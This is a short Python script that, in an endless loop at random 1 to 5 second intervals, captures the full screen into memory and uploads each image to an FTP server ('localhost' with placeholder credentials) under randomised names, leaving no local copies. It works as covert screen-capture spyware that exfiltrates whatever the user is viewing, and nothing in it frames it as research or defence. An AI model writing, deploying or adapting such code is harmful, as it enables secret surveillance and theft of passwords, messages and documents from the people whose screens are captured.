import time 
import ftplib
import datetime 

import pyautogui
import random
import time
import os

import io

# FTP server details
def sendOverFTP(file):
    session = ftplib.FTP('localhost','admin','passwordExample')
    #create a filename with random and date
    finename = str(random.randint(1,1000)) + str(datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")) + '.png'
    session.storbinary('STOR '+ finename , file)     # send the file
    #when file is sent, delete it
    # file.close()                                  
    return file


def takeSreenShot():
    #date with not spaces
    date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    myScreenshot = pyautogui.screenshot()
    ioB = io.BytesIO()

    #use io.BytesIO to save the image in memory
    myScreenshot.save(ioB, format='PNG')
    ioB.seek(0)
    return ioB


while True:
    random_time = random.randint(1, 5)
    time.sleep(random_time)
    image = takeSreenShot()
    sendOverFTP(image)